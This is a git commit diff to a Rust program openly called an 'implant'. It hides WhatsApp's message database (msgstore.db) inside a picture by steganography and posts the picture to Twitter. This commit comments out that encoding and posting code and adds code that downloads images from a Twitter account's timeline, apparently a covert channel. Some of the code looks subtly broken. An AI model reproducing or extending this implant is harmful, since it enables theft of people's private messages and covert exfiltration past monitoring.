3a62c8752cc976cf138be102e2e6a1bbabc10c6f
Connor Reardon <connor@Connors-MacBook-Pro.local>
2020-04-26 17:32:31 -0400

    updated implant

--- implant/src/main.rs
+++ implant/src/main.rs
@@ -6,15 +6,19 @@ use encoder::Encoder;
 use errors::Error;
 use utils::ByteMask;
 use tokio;
+use std::io::prelude::*;
+use std::fs::File;
 use egg_mode::tweet::DraftTweet;
+use std::string::ToString;
 use egg_mode::media::{get_status, media_types, set_metadata, upload_media, ProgressInfo};
+use reqwest;
 extern crate egg_mode;
 
 
 fn main() -> Result<(), Error> {
     let mask = ByteMask::new(2)?;
     twitter_test();
-    encode(PathBuf::from("/sdcard/Pictures/myfavoritetoast.jpg"), PathBuf::from("/data/data/com.whatsapp/databases/msgstore.db"), PathBuf::from("/data/othertoast.png"), mask)?;
+    //encode(PathBuf::from("/sdcard/Pictures/myfavoritetoast.jpg"), PathBuf::from("/data/data/com.whatsapp/databases/msgstore.db"), PathBuf::from("/data/othertoast.png"), mask)?;
     //encode(PathBuf::from("/Users/connor/Desktop/myfavoritetoast.jpg"), PathBuf::from("/User/connor/Desktop/message.txt"), PathBuf::from("/Users/connor/Desktop/othertoast.png"), mask)?;
     Ok(())
 }
@@ -27,17 +31,35 @@ async fn twitter_test() -> Result<(), Box<dyn std::error::Error>> {
         consumer: con_token,
         access: access_token,
     };
-    let mut tweet = DraftTweet::new(" ");
-    let typ = media_types::image_png();
-    let bytes = std::fs::read("/sdcard/Pictures/othertoast.png")?;
-    let handle = upload_media(&bytes, &typ, &token).await?;
-    tweet.add_media(handle.id.clone());
-    println!("ADDED");
-    tweet.send(&token).await?;
-    println!("TWEETED");
+    let user_id = "ToastDisciples";
+    //let mut tweet = DraftTweet::new(" ");
+    //let typ = media_types::image_png();
+    //let bytes = std::fs::read("/Users/connor/Desktop/othertoast.png")?;
+    //let handle = upload_media(&bytes, &typ, &token).await?;
+    //tweet.add_media(handle.id.clone());
+    //println!("ADDED");
+    //tweet.send(&token).await?;
+    //println!("TWEETED");
+    let user = egg_mode::tweet::user_timeline(user_id, true, true, &token).with_page_size(5);
+    let (_user, feed) = user.start().await?;
+    for status in feed.iter() {
+        //print_tweet(&status);
+        let mut i:u32 = 0;
+        if let Some(ref media) = status.extended_entities{
+            for info in &media.media {
+                println!("{}", info.media_url);
+                let res = reqwest::get(&(info.media_url).to_string()).body.await?;
+                let file_name = format!("image_{}", i);
+                let mut file = File::create(file_name).unwrap();
+                file.write_all(&res);
+                i = i + 1;
+            }
+        }
+        println!("");
+    }
+    
     Ok(())
 }
-
 
 fn encode(image: PathBuf, secret: PathBuf, output: PathBuf, mask: ByteMask) -> Result<(), Error> {
     let mut encoder = Encoder::new(image, secret, mask)?;
